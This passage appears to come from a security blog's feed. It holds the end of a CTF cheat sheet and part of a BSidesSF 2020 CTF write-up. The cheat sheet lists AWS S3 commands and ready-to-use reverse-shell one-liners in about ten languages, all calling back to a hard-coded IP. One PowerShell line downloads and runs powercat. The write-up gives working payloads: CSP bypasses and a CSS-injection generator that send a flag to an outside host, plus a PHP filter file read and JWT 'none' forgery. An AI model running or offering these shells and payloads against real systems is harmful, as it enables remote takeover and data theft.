href="#AWS" class="headerlink" title="AWS"></a>AWS</h2><h3 id="bucket"><a href="#bucket" class="headerlink" title="bucket"></a>bucket</h3><ul><li><p>public bucket</p><ul><li>list objects</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 ls s3:&#x2F;&#x2F;a700de6aeab6ef373e7d</span><br></pre></td></tr></table></figure><ul><li>copy objects</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aws s3 cp s3:&#x2F;&#x2F;b1f507894bee098d7e9d&#x2F;flag.txt .</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># aws s3api put-bucket-acl --bucket b1f507894bee098d7e9d --acl authenticated-read</span><br><span class="line"># aws s3api put-object-acl --bucket b1f507894bee098d7e9d --key flag.txt --acl authenticated-read</span><br></pre></td></tr></table></figure><ul><li>pre-signed URLs<ul><li><a href="https://n0j.github.io/2017/10/02/aws-s3-ctf.html" target="_blank" rel="noopener">https://n0j.github.io/2017/10/02/aws-s3-ctf.html</a></li></ul></li></ul></li></ul><h2 id="one-day-exploit"><a href="#one-day-exploit" class="headerlink" title="one day exploit"></a>one day exploit</h2><ul><li>추가예정</li><li>실효성 낮음</li></ul><h2 id="reverse-shell"><a href="#reverse-shell" class="headerlink" title="reverse shell"></a>reverse shell</h2><ul><li><p>perl</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="15.165.0.114";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure></li><li><p>bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/15.165.0.114/8888 0&gt;&amp;1</span><br><span class="line">bash -c <span class="string">'bash -i &gt;&amp; /dev/tcp/15.165.0.114/8888 0&gt;&amp;1'</span></span><br><span class="line">0&lt;&amp;196;<span class="built_in">exec</span> 196&lt;&gt;/dev/tcp/15.165.0.114/8888; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure></li><li><p>php</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("15.165.0.114",8888);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure></li><li><p>nc -e</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 15.165.0.114 8888</span><br></pre></td></tr></table></figure></li><li><p>telnet</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; telnet 15.165.0.114 8888 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br></pre></td></tr></table></figure></li><li><p>python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("15.165.0.114",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure></li><li><p>ruby</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">'exit if fork;c=TCPSocket.new("15.165.0.114","8888");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span></span><br></pre></td></tr></table></figure></li><li><p>nodejs</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">"net"</span>), sh = <span class="built_in">require</span>(<span class="string">"child_process"</span>).exec(<span class="string">"/bin/bash"</span>); <span class="keyword">var</span> client = <span class="keyword">new</span> net.Socket(); client.connect(<span class="number">8888</span>, <span class="string">"15.165.0.114"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;client.pipe(sh.stdin);sh.stdout.pipe(client); sh.stderr.pipe(client);&#125;);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">"bash -c 'bash -i &gt;&amp; /dev/tcp/15.165.0.114/8888 0&gt;&amp;1'"</span>);</span><br></pre></td></tr></table></figure></li><li><p>java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime r = Runtime.getRuntime();Process p = r.exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/15.165.0.114/5278;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;);p.waitFor();</span><br></pre></td></tr></table></figure></li><li><p>powershell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (<span class="built_in">New-Object</span> System.Net.Webclient).DownloadString(<span class="string">'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'</span>);powercat <span class="literal">-c</span> <span class="number">15.165</span>.<span class="number">0.114</span> <span class="literal">-p</span> <span class="number">8888</span> <span class="literal">-e</span> cmd</span><br></pre></td></tr></table></figure></li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://github.com/w181496/Web-CTF-Cheatsheet" target="_blank" rel="noopener">https://github.com/w181496/Web-CTF-Cheatsheet</a></li><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CheatSheet </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BSidesSF 2020 CTF</title>
      <link href="/BSidesSF-2020-CTF/"/>
      <url>/BSidesSF-2020-CTF/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/977" target="_blank" rel="noopener">https://ctftime.org/event/977</a></li></ul><h2 id="376pts-cards"><a href="#376pts-cards" class="headerlink" title="[376pts] cards"></a>[376pts] cards</h2><blockquote><p>San Francisco has the occasional underground card room. Can you run the table in this game?</p><p><a href="https://cards-d38741c8.challenges.bsidessf.net/" target="_blank" rel="noopener">https://cards-d38741c8.challenges.bsidessf.net</a></p></blockquote><p><img src="/img/2020/02/image-20200225211525791.png" alt="image-20200225211525791"></p><p>In the challenge site, you can play <a href="https://en.wikipedia.org/wiki/Blackjack" target="_blank" rel="noopener">Blackjack</a>.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://cards-d38741c8.challenges.bsidessf.net/api/config</span></span><br><span class="line">&#123;<span class="string">"Goal"</span>:<span class="number">100000</span>,<span class="string">"MinBet"</span>:<span class="number">10</span>,<span class="string">"MaxBet"</span>:<span class="number">500</span>,<span class="string">"GameHandler"</span>:<span class="string">"/game.go"</span>,<span class="string">"DeckHandler"</span>:<span class="string">"/deck.go"</span>&#125;</span><br></pre></td></tr></table></figure><p>Users are given <code>$1000</code> initial balance. and from <code>/api/config</code>, you can get the flag when achieve <code>$100000</code>.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://cards-d38741c8.challenges.bsidessf.net/api</span></span><br><span class="line">&#123;<span class="string">"SecretState"</span>:<span class="string">"2fd8d83c ... 54e39799"</span>,<span class="string">"PlayerHand"</span>:[],<span class="string">"DealerHand"</span>:[],<span class="string">"Balance"</span>:<span class="number">1000</span>,<span class="string">"GameState"</span>:<span class="string">"Idle"</span>,<span class="string">"SessionState"</span>:<span class="string">"Playing"</span>,<span class="string">"Bet"</span>:<span class="number">0</span>&#125;</span><br></pre></td></tr></table></figure><p>In <code>/api</code>, the <code>SecretState</code> property has a hex byte in the form of json, which contains the value of the user’s balance with encryption.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// https://cards-d38741c8.challenges.bsidessf.net/api/deal</span></span><br><span class="line">&#123;<span class="string">"SecretState"</span>:<span class="string">"e2ad07a3 ... d62c519d"</span>,<span class="string">"PlayerHand"</span>:[[<span class="string">"7"</span>,<span class="string">"Clubs"</span>],[<span class="string">"Queen"</span>,<span class="string">"Clubs"</span>]],<span class="string">"DealerHand"</span>:[[<span class="string">"X"</span>,<span class="string">"X"</span>],[<span class="string">"6"</span>,<span class="string">"Spades"</span>]],<span class="string">"Balance"</span>:<span class="number">990</span>,<span class="string">"GameState"</span>:<span class="string">"Playing"</span>,<span class="string">"SessionState"</span>:<span class="string">"Playing"</span>,<span class="string">"Bet"</span>:<span class="number">10</span>&#125;</span><br></pre></td></tr></table></figure><p>If you send a request to <code>/api/deal</code> with the initial <code>SecretState</code> value, the cards of the player and dealer have randomly chosen. Sometimes the player’s card make BlackJack, and in that case, the game is over and the Balance goes up instantly.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Win or Lose?</span></span><br><span class="line">&#123;<span class="string">"SecretState"</span>:<span class="string">"d113e3fb ... b86484c1"</span>,<span class="string">"PlayerHand"</span>:[[<span class="string">"7"</span>,<span class="string">"Clubs"</span>],[<span class="string">"Queen"</span>,<span class="string">"Clubs"</span>]],<span class="string">"DealerHand"</span>:[[<span class="string">"X"</span>,<span class="string">"X"</span>],[<span class="string">"6"</span>,<span class="string">"Spades"</span>]],<span class="string">"Balance"</span>:<span class="number">500</span>,<span class="string">"GameState"</span>:<span class="string">"Playing"</span>,<span class="string">"SessionState"</span>:<span class="string">"Playing"</span>,<span class="string">"Bet"</span>:<span class="number">500</span>&#125;</span><br><span class="line"><span class="comment">// Blackjack!</span></span><br><span class="line">&#123;<span class="string">'SecretState'</span>: <span class="string">'d113e3fb ... b86484c1'</span>, <span class="string">'PlayerHand'</span>: [[<span class="string">'Jack'</span>, <span class="string">'Spades'</span>], [<span class="string">'Ace'</span>, <span class="string">'Spades'</span>]], <span class="string">'DealerHand'</span>: [[<span class="string">'3'</span>, <span class="string">'Hearts'</span>], [<span class="string">'6'</span>, <span class="string">'Clubs'</span>]], <span class="string">'Balance'</span>: <span class="number">1750</span>, <span class="string">'GameState'</span>: <span class="string">'Blackjack'</span>, <span class="string">'SessionState'</span>: <span class="string">'Playing'</span>, <span class="string">'Bet'</span>: <span class="number">500</span>&#125;</span><br></pre></td></tr></table></figure><p>The point is that if you lose or lose, the SecretState doesn’t destroy the value, so if you keep making deals until the Black Jack comes out, it’s possible to increase Balance continuously.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">state = requests.post(<span class="string">'https://cards-d38741c8.challenges.bsidessf.net/api'</span>).json()[<span class="string">'SecretState'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    res = requests.post(<span class="string">'https://cards-d38741c8.challenges.bsidessf.net/api/deal'</span>, json = &#123;<span class="string">'Bet'</span>: <span class="number">500</span>, <span class="string">'SecretState'</span>: state&#125;).json()</span><br><span class="line">    <span class="keyword">if</span> res[<span class="string">'GameState'</span>] == <span class="string">'Blackjack'</span>:</span><br><span class="line">        print(res)</span><br><span class="line">        state = res[<span class="string">'SecretState'</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'Flag'</span> <span class="keyword">in</span> res:</span><br><span class="line">        print(res[<span class="string">'Flag'</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>This script implements the description.</p><p><img src="/img/2020/02/image-20200225214251382.png" alt="image-20200225214251382"></p><h2 id="51pts-csp-1"><a href="#51pts-csp-1" class="headerlink" title="[51pts] csp-1"></a>[51pts] csp-1</h2><blockquote><p>Can you bypass the CSP to steal the flag?</p><p><a href="https://csp-1-5aa1f221.challenges.bsidessf.net/" target="_blank" rel="noopener">https://csp-1-5aa1f221.challenges.bsidessf.net</a></p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src 'self' data:; default-src 'self'; connect-src *; report-uri /csp_report</span><br></pre></td></tr></table></figure><p>Basic CSP bypass challenge. There is no filtering policy in script insertion, and Incredibly, the <code>script-src</code> policy authorizes data schema, making CSP meaningless.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"data:,fetch('/csp-one-flag').then(x=&gt;x.text()).then(x=&gt;location='http://rwx.kr/?'+escape(x))"</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/2020/02/image-20200225214623280.png" alt="image-20200225214623280"></p><h2 id="51pts-csp-2"><a href="#51pts-csp-2" class="headerlink" title="[51pts] csp-2"></a>[51pts] csp-2</h2><blockquote><p>Can you bypass the CSP to steal the flag?</p><p><a href="https://csp-2-2446d5a3.challenges.bsidessf.net/" target="_blank" rel="noopener">https://csp-2-2446d5a3.challenges.bsidessf.net</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#39;self&#39; ajax.googleapis.com &#39;unsafe-eval&#39;; default-src &#39;self&#39; &#39;unsafe-inline&#39;; connect-src *; report-uri &#x2F;csp_report</span><br></pre></td></tr></table></figure><p>It’s similar to previous one. <code>script-src</code> allows embeding <code>ajax.googleapis.com</code> . The <code>ajax.googleapis.com</code> contains an <code>Angularjs</code> script, so you can bypass the <code>CSP</code> using the <code>Angularjs Template</code>.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.min.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span> <span class="attr">ng-csp</span>&gt;</span></span><br><span class="line">&#123;&#123;constructor.constructor('eval(atob("ZmV0Y2goIi9jc3AtdHdvLWZsYWciKS50aGVuKHg9PngudGV4dCgpKS50aGVuKHg9PmxvY2F0aW9uPSIvL3J3eC5rci8/Iitlc2NhcGUoeCkp"))')()&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/2020/02/image-20200225215149637.png" alt="image-20200225215149637"></p><h2 id="87pts-fun-with-flags"><a href="#87pts-fun-with-flags" class="headerlink" title="[87pts] fun with flags"></a>[87pts] fun with flags</h2><blockquote><p>The admin, Sheldon has the challenge flag, can you steal it?</p><p><a href="https://fun-with-flags-3b5279f5.challenges.bsidessf.net/" target="_blank" rel="noopener">https://fun-with-flags-3b5279f5.challenges.bsidessf.net</a></p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"flag"</span> <span class="attr">value</span>=<span class="string">Try</span> <span class="attr">reading</span> <span class="attr">this</span> <span class="attr">value</span>&gt;</span></span><br></pre></td></tr></table></figure><p>CSS Injection challenge has message sending function to admin.<br>all of other tags are filtered, but because of <code>&lt;style&gt;</code> tags are allowed, you can use the payload generator below to get the value of the input tag with the name property flag.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">header(<span class="string">"Content-Type: text/css; charset=UTF-8"</span>);</span><br><span class="line"><span class="keyword">for</span> ($ascii = <span class="number">20</span>; $ascii &lt; <span class="number">128</span>; $ascii++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($ascii == <span class="number">92</span>) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'input[name=flag][value^="'</span>.$a.htmlentities(chr($ascii)).<span class="string">'"] &#123;</span></span><br><span class="line"><span class="string">                background-image: url("http://rwx.kr/?FOUND='</span>.$a.urlencode(chr($ascii)).<span class="string">'");</span></span><br><span class="line"><span class="string">        &#125;'</span>.<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;let_the_shellz_rise_b4_baking&#125;</span><br></pre></td></tr></table></figure><p>It is convenient to write an attack in Python script. But I sent them one by one because it was hassle.</p><h2 id="51pts-had-a-bad-day"><a href="#51pts-had-a-bad-day" class="headerlink" title="[51pts] had a bad day"></a>[51pts] had a bad day</h2><blockquote><p>Can you read flag.php?</p><p><a href="https://had-a-bad-day-5b3328ad.challenges.bsidessf.net/" target="_blank" rel="noopener">https://had-a-bad-day-5b3328ad.challenges.bsidessf.net</a></p></blockquote><p><img src="/img/2020/02/image-20200225220005141.png" alt="image-20200225220005141"></p><p>There’s two buttons. If click on them, forwarded to <code>/index.php?category=woofers</code> and <code>/index.php?category=woofers</code> each. Since <code>woofer.php</code> shows the same of <code>index.php?category=/woofers.php</code>, we can expect scripts like <code>include($_GET[&#39;category&#39;] + &#39;.php&#39;)</code> to be within <code>index.php</code>.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from index.php?category=php://filter/convert.base64-encode/resource=index</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = $_GET[<span class="string">'category'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($file))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>( strpos( $file, <span class="string">"woofers"</span> ) !==  <span class="keyword">false</span> || strpos( $file, <span class="string">"meowers"</span> ) !==  <span class="keyword">false</span> || strpos( $file, <span class="string">"index"</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span> ($file . <span class="string">'.php'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Sorry, we currently only support woofers and meowers."</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>You can get the source of <code>index.php</code> using php wrapper.<br>If the <code>index</code> string is included in the parameter, filtering is likely to be bypassed.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php?category=php://filter/convert.base64-encode/resource=index/../flag</span></span><br><span class="line">PCEtLSBDYW4geW91IHJlYWQgdGhpcyBmbGFnPyAtLT4KPD9waHAKIC8vIENURntoYXBwaW5lc3NfbmVlZHNfbm9fZmlsdGVyc30KPz4=</span><br><span class="line"></span><br><span class="line"><span class="comment">// decoded</span></span><br><span class="line">&lt;!-- Can you read this flag? --&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="comment">// CTF&#123;happiness_needs_no_filters&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="157pts-recipes"><a href="#157pts-recipes" class="headerlink" title="[157pts] recipes"></a>[157pts] recipes</h2><blockquote><p>I’ve found this recipe storage service. Rumor has it that the famous San Francisco-based Boudin Bakery is working on a new recipe. Can you get that for me?</p><p><a href="https://recipes-0abb43f9.challenges.bsidessf.net/" target="_blank" rel="noopener">https://recipes-0abb43f9.challenges.bsidessf.net</a></p></blockquote><p>The points of this problem are <code>JWT authentication bypass</code> and <code>SSRF</code>.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link"</span> <span class="attr">href</span>=<span class="string">"/recipes"</span>&gt;</span>Recipes<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link"</span> <span class="attr">href</span>=<span class="string">"/logout"</span>&gt;</span>Logout<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item d-none"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link"</span> <span class="attr">href</span>=<span class="string">"/users"</span>&gt;</span>Users<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Not visible on rendered screen, but you can find <code>/users</code> route from html source.</p><p><img src="/img/2020/02/image-20200225221039313.png" alt="image-20200225221039313"></p><p>If you try to connect, you’ll be given a hint that you can only connect to the local host.</p><p><img src="/img/2020/02/image-20200225221221820.png" alt="image-20200225221221820"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>users<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"recipe-body"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">b</span>&gt;</span>By posix<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"data:application/octet-stream;base64,CjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI<span class="symbol">&amp;#43;</span>Cgo8aGVhZD4KCiAgPG1ldGEgY2hhcnNldD0idXRmLTgiPgogIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSwgc2hyaW ... "</span>&gt;</span></span><br></pre></td></tr></table></figure><p>In recipe creation feature, If you submit with a local host address to <code>Picture URL</code>, you can get the contents of the base64 encoded <code>/users</code> page on the entry of the image address.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'/profile/6180f0c8-778b-442f-a5ab-10e18bef4c2d'</span>&gt;</span>boudin_bakery<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br></pre></td></tr></table></figure><p>If you decode the contents, you can find the uuid of the <code>boudin_bakery</code> account.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// jwt</span></span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1ODI2Mzk5NzIsImlhdCI6MTU4MjYzNjM3MiwiaXNzIjoicmVjaXBlYm90IiwibmJmIjoxNTgyNjM2MzcyLCJzdWIiOiIyYzc4ZDJmNy03OGRlLTQwYzEtODFjNi1lYTJlOTc3MDQ2YWUifQ.jgTO8jUAOGFi_vmyGhs90aM0PVWU6f8NG5zSRdb8zhw</span><br><span class="line"><span class="comment">// decoded</span></span><br><span class="line">header : &#123;<span class="string">"alg"</span>:<span class="string">"HS256"</span>,<span class="string">"typ"</span>:<span class="string">"JWT"</span>&#125;</span><br><span class="line">content : &#123;<span class="string">"exp"</span>:<span class="number">1582639972</span>,<span class="string">"iat"</span>:<span class="number">1582636372</span>,<span class="string">"iss"</span>:<span class="string">"recipebot"</span>,<span class="string">"nbf"</span>:<span class="number">1582636372</span>,<span class="string">"sub"</span>:<span class="string">"2c78d2f7-78de-40c1-81c6-ea2e977046ae"</span>&#125;</span><br><span class="line">signature : <span class="xml"><span class="tag">&lt;<span class="name">binary</span> <span class="attr">data</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>The JWT stores in cookies contains user’s uuid value.<br>You can change the sub value to a uuid of <code>boudin_bakery</code> account’s using <code>jwt none type input</code>.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// plain</span></span><br><span class="line">header : &#123;<span class="string">"alg"</span>:<span class="string">"none"</span>,<span class="string">"typ"</span>:<span class="string">"JWT"</span>&#125;</span><br><span class="line">content : &#123;<span class="string">"exp"</span>:<span class="number">1582639972</span>,<span class="string">"iat"</span>:<span class="number">1582636372</span>,<span class="string">"iss"</span>:<span class="string">"recipebot"</span>,<span class="string">"nbf"</span>:<span class="number">1582636372</span>,<span class="string">"sub"</span>:<span class="string">"6180f0c8-778b-442f-a5ab-10e18bef4c2d"</span>&#125;</span><br><span class="line">signature : <span class="xml"><span class="tag">&lt;<span class="name">binary</span> <span class="attr">data</span>&gt;</span></span></span><br><span class="line"><span class="xml">// built jwt</span></span><br><span class="line"><span class="xml">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJleHAiOjE1ODI2Mzk5NzIsImlhdCI6MTU4MjYzNjM3MiwiaXNzIjoicmVjaXBlYm90IiwibmJmIjoxNTgyNjM2MzcyLCJzdWIiOiI2MTgwZjBjOC03NzhiLTQ0MmYtYTVhYi0xMGUxOGJlZjRjMmQifQ.</span></span><br></pre></td></tr></table></figure><p>If you complete jwt in the above way and try connecting, you can see the flag in the <code>Flag Bread</code> item.</p><p><img src="/img/2020/02/image-20200225222113311.png" alt="image-20200225222113311"></p><h2 id="51pts-simple-todos"><a href="#51pts-simple-todos" class="headerlink" title="[51pts] simple todos"></a>[51pts] simple todos</h2><blockquote><p>For my new job as a San Franisco tour guide, I totally realized that I can use the Meteor <a href="https://www.meteor.com/tutorials/blaze/creating-an-app" target="_blank" rel="noopener">simple-todos tutorial</a>! It was really easy, the app works perfectly by step 9 of the tutorial, you don’t even need to write your own ‘publish and subscribe’ code! It’s all done for you!</p><p><a href="https://simple-todos-6c7bf285.challenges.bsidessf.net/" target="_blank" 